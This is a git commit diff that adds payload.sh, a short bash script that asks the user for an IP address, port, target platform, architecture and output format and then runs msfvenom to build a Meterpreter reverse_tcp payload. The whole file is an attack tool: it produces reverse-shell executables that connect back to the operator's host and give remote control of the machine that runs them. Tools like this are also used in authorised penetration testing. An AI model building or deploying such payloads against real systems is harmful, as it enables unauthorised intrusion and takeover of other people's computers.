57e8fa419ef41ce4fd4f2b0c3f7001de4578a0d2
Harsh Dhawle <80086907+snafuboi7598@users.noreply.github.com>
2021-08-16 20:11:58 +0530

    Update payload.sh

--- payload.sh
+++ payload.sh
@@ -1,1 +1,19 @@
 
+#!/bin/bash
+function payload(){
+	msfvenom -p $os/$arch_type/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f $format -o $payload_name
+}
+echo 'your ip'
+read LHOST
+echo 'open port'
+read LPORT
+echo 'payload name'
+read payload_name
+echo 'which plateform (windows osx)'
+read os
+echo 'arch (x64 x86)'
+read arch_type
+echo 'format'
+read format
+
+payload
